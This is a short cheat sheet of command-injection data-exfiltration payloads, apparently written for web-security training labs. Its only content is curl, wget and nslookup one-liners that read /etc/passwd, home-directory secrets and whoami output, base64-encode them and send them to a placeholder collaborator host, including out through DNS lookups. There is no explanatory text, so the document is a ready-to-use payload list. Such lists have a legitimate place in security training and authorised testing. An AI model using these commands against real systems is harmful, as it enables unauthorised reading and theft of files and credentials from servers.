# Command Injection - Data Exfiltration

### Curl Commands

```bash
cat /home/carlos/secret | base64 | curl -d @- http://COLLABORATOR-ID.oastify.com
ls /home/carlos | base64 | curl -d @- https://COLLABORATOR-ID.oastify.com
whoami | base64 | curl -d @- https://COLLABORATOR-ID.oastify.com

---

curl -X POST --data-binary @/etc/passwd https://COLLABORATOR-ID.oastify.com

---

ls -la /home/carlos > /tmp/output && curl -X POST --data-binary @/tmp/output    https://COLLABORATOR-ID.oastify.com
```

### NSlookup Commands

```bash
nslookup `whoami`.COLLABORATOR-ID.oastify.com
nslookup `cat /home/carlos/morale.txt`.COLLABORATOR-ID.oastify.com
```

### Wget Commands

```bash
wget --post-file=/etc/passwd  https://COLLABORATOR-ID.oastify.com
wget --post-file=/home/carlos/secret  https://COLLABORATOR-ID.oastify.com
```